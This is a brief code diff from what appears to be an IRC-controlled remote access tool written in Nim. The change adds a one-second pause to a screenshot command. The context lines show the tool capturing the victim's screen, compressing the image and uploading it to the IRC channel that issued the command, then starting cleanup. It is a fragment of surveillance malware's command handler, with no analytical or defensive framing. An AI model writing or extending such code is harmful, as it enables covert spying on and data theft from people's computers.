@@ -363,7 +363,7 @@ proc cmd_screenshot(event:IrcEvent, client:AsyncIrc) {.async.} =
                 bitmap_contents = readFile($rand_filename & ".bmp")
                 bitmap_compress = compress(bitmap_contents)
             writeFile($rand_filename & ".gz", bitmap_compress)
-
+            sleep(1000)
             var faketokens:seq[string] = @["", $rand_filename & ".gz"]
             await cmd_getFileIO(event, client, faketokens)
             await client.privmsg(event.origin,"starting cleanup")
